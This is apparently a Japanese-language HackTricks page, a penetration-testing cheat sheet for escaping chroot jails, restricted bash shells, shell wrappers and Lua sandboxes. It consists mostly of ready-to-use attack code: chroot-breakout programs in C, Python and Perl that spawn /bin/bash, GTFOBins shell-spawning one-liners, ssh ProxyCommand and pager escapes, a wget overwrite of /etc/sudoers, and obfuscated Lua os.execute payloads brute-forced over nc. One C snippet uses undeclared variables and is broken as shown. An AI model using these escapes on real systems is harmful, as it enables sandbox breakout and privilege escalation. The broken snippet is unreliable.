# Jail からの脱出

## **GTFOBins**

**"Shell" property を持つ binary を実行できるかどうか** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **で検索します**

## Chroot Escapes

[wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations) より: chroot mechanism は、**privileged** (**root**) **users** による意図的な改変から防御することを**意図していません**。ほとんどのシステムでは、chroot contexts は正しく stack されず、**十分な privileges を持つ** chrooted programs は、**2 回目の chroot を実行して脱出できる場合があります**。\
通常、これは脱出するために chroot 内で root になる必要があることを意味します。<sup>[[4]](#references)</sup>

> [!TIP]
> **tool** [**chw00t**](https://github.com/earthquake/chw00t) は、以下の scenarios を abuse して `chroot` から脱出するために作成されました。<sup>[[1]](#references)[[5]](#references)</sup>

### Root + CWD

> [!WARNING]
> chroot 内で **root** の場合、**別の chroot を作成して脱出できます**。これは (Linux では) 2 つの chroot が共存できないためです。そのため、folder を作成し、その新しい folder に対して **新しい chroot を作成**し、その際に**自分自身をその外側に置く**と、結果として**新しい chroot の外側にいる**ことになり、FS 内にいる状態になります。
>
> これは通常、chroot が working directory を指定された場所へ移動させないために発生します。そのため、chroot を作成しても、その外側にいることができます。<sup>[[4]](#references)[[5]](#references)</sup>

通常、chroot jail 内に `chroot` binary はありませんが、binary を**compile、upload、execute**することは**可能です**:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> これは前のケースと似ていますが、このケースでは**攻撃者が現在のディレクトリへのファイルディスクリプターを保存**し、その後、**新しいフォルダーに chroot を作成**します。最終的に、chroot の**外部**でその**FD**への**アクセス**を持っているため、それにアクセスして**脱出**します。<sup>[[4]](#references)[[5]](#references)</sup>

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD は Unix Domain Sockets 経由で渡すことができるため、次の手順を実行します。
>
> - 子プロセスを作成する（fork）
> - 親プロセスと子プロセスが通信できるように UDS を作成する
> - 子プロセス内で、別のフォルダに対して chroot を実行する
> - 親プロセスで、新しい子プロセスの chroot の外側にあるフォルダの FD を作成する
> - UDS を使用して、その FD を子プロセスに渡す
> - 子プロセスでその FD に対して chdir を実行する。FD は子プロセスの chroot の外側にあるため、jail から脱出できます。<sup>[[5]](#references)[[6]](#references)</sup>

### Root + Mount

> [!WARNING]
>
> - root device (/) を chroot 内のディレクトリに mount する
> - そのディレクトリに chroot する
>
> これは Linux で可能です。<sup>[[5]](#references)</sup>

### Root + /proc

> [!WARNING]
>
> - procfs を chroot 内のディレクトリに mount する（まだ mount されていない場合）
> - 異なる root/cwd エントリを持つ pid を探す。例: /proc/1/root
> - そのエントリに chroot する。<sup>[[4]](#references)[[5]](#references)[[7]](#references)</sup>

### Root(?) + Fork

> [!WARNING]
>
> - Fork（子プロセス）を作成し、FS 内のより深い別のフォルダに chroot して、そのフォルダに CD する
> - 親プロセスから、子プロセスがいるフォルダを、子プロセスの chroot より前のフォルダに移動する
> - この子プロセスは chroot の外側にいることになります。<sup>[[5]](#references)</sup>

### ptrace

> [!WARNING]
>
> - プロセスが `ptrace` で attach できるかどうかは、credentials、capabilities、および Yama などの有効な security modules に依存します。そのため、同一ユーザーによる debugging も system policy によって制限される場合があります。<sup>[[8]](#references)</sup>
> - attach が許可されている場合、プロセスに ptrace して、その内部で shellcode を実行できます（[この例を参照](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)）。<sup>[[5]](#references)[[8]](#references)</sup>

## Bash Jails

### Enumeration

jail に関する情報を取得します。
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### PATHの変更

PATH環境変数を変更できるか確認します。<sup>[[2]](#references)</sup>
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### vim の使用

Vim が利用可能な場合は、実行可能な `shell` を設定し、`:shell` を実行します。<sup>[[10]](#references)</sup>
```bash
:set shell=/bin/sh
:shell
```
### Pagers と help viewers

多くの restricted environments では、**pagers** や **help viewers** が依然として利用可能です。通常、`PATH` を再構築しようとするよりも、これらを abuse するほうが簡単です。
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
`git` が利用可能な場合、その `--paginate` オプションは出力を `less` または `$PAGER` に送信するため、pager escape が利用可能な場合に便利です。<sup>[[9]](#references)</sup>
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### Common GTFOBins one-liners

アクセス可能なバイナリが判明したら、まずは明らかな shell spawner をテストします：
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
許可された command を自由に実行するのではなく、**引数を inject** することしかできない場合は、**GTFOArgs** も確認してください。<sup>[[17]](#references)</sup>

### script の作成

内容として _/bin/bash_ を持つ executable file を作成できるか確認します
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### SSH から bash を取得

ssh 経由でアクセスしている場合、restricted login shell の代わりにサーバーへ**別のプログラム**を実行させられることがあります。<sup>[[14]](#references)</sup>
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
`ssh` がローカルで許可されている数少ないバイナリの 1 つである場合、それが **GTFOBin** として悪用できることも覚えておいてください。`LocalCommand` および `ProxyCommand` オプションは、ローカルで設定されたヘルパーコマンドを実行します。<sup>[[14]](#references)[[15]](#references)</sup>
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### 宣言

Bashでは、namerefは代入を別の変数にリダイレクトし、`BASH_CMDS`に要素を追加すると、そのコマンドがBashの内部コマンドハッシュテーブルに追加されます。<sup>[[11]](#references)[[12]](#references)</sup>
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Wgetの`-O`オプションは、downloadしたコンテンツを指定したoutput fileに書き込みます。そのパスが書き込み可能な場合、`/etc/sudoers`などのファイルを上書きできます。<sup>[[13]](#references)</sup>
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### 制限付き shell wrapper（`git-shell`、`rssh`、`lshell`）

環境によっては、通常の `rbash` ではなく、`git-shell`、`rssh`、`lshell` などの **wrapper** に接続されることがあります。

- `git-shell` は、サーバー側の Git コマンドと、`~/git-shell-commands/` 内に存在するものだけを受け付けます。このディレクトリが存在する場合は、`help` を実行して許可されているカスタムアクションを列挙します。そこに **write** できる場合、そのディレクトリに配置した実行可能ファイルはすべて到達可能になります。<sup>[[3]](#references)</sup>
- `rssh` / `lshell` では、一般的に `scp`、`sftp`、`rsync`、または Git 形式の操作だけが許可されます。その場合は、まず **file write primitive** に注目します。`authorized_keys`、shell startup file、または helper script を write 可能な場所にアップロードし、その後 `ssh -t ...` で再接続します。
- wrapper が command line だけをフィルタリングしている場合は、到達可能な binary を列挙し、そこから **GTFOBins / GTFOArgs** に移行します。

### その他の tricks

以下も確認してください。

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**以下のページも興味深いかもしれません。**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Python Jails

python jail から脱出する tricks については、以下のページを参照してください。


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

このページでは、lua 内でアクセス可能な global function を確認できます：[https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)。<sup>[[16]](#references)</sup>

標準の `load`、`string.char`、`os.execute` function が利用可能な場合、これらを使ってこの chunk を構築し、実行できます。<sup>[[16]](#references)</sup>
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
テーブル関数は、ドット構文の代わりに `rawget` を使って取得することもできます。<sup>[[16]](#references)</sup>
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
`pairs`を使用してライブラリテーブルを列挙します。<sup>[[16]](#references)</sup>
```bash
for k,v in pairs(string) do print(k,v) end
```
`pairs` がテーブルのインデックスを列挙する順序は未規定であるため、特定の関数が最初に現れることを前提にしてはいけません。特定の関数を実行する必要がある場合は、異なる lua environments を読み込み、ライブラリの最初の関数を呼び出すことで brute force attack を実行できます。<sup>[[16]](#references)</sup>
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**interactive lua shell の取得**: 制限された lua shell 内にいる場合、`debug.debug()` を呼び出すことで新しい lua shell（できれば無制限のもの）を取得できます。これにより interactive mode に入ります。<sup>[[16]](#references)</sup>
```bash
debug.debug()
```
## References

- [1] [Chw00t: さまざまな chroot ソリューションから脱出する方法 (Bucsay Balazs、DeepSec の講演とスライド)](https://www.youtube.com/watch?v=UO618TeyCWo)
- [2] [GNU Bash Reference Manual – 制限付き Shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [3] [git-shell – Git Documentation](https://git-scm.com/docs/git-shell)
- [4] [chroot(2) – Linux manual page](https://man7.org/linux/man-pages/man2/chroot.2.html)
- [5] [chw00t – chroot escape tool](https://github.com/earthquake/chw00t)
- [6] [unix(7) – Linux manual page](https://man7.org/linux/man-pages/man7/unix.7.html)
- [7] [proc_pid_root(5) – Linux manual page](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
- [8] [ptrace(2) – Linux manual page](https://man7.org/linux/man-pages/man2/ptrace.2.html)
- [9] [git – Git Documentation](https://git-scm.com/docs/git)
- [10] [:shell – Vim documentation](https://vimhelp.org/various.txt.html#%3Ashell)
- [11] [Bash Builtins – GNU Bash Reference Manual](https://www.gnu.org/software/bash/manual/html_node/Bash-Builtins.html)
- [12] [Bash Variables – GNU Bash Reference Manual](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [13] [GNU Wget Manual](https://www.gnu.org/software/wget/manual/wget.html)
- [14] [ssh(1) – OpenBSD manual page](https://man.openbsd.org/ssh)
- [15] [ssh_config(5) – OpenBSD manual page](https://man.openbsd.org/ssh_config)
- [16] [Lua 5.4 Reference Manual](https://www.lua.org/manual/5.4/manual.html)
- [17] [GTFOArgs: Argument Injection Exploitation Vector List](https://gtfoargs.github.io/)
{{#include ../../banners/hacktricks-training.md}}
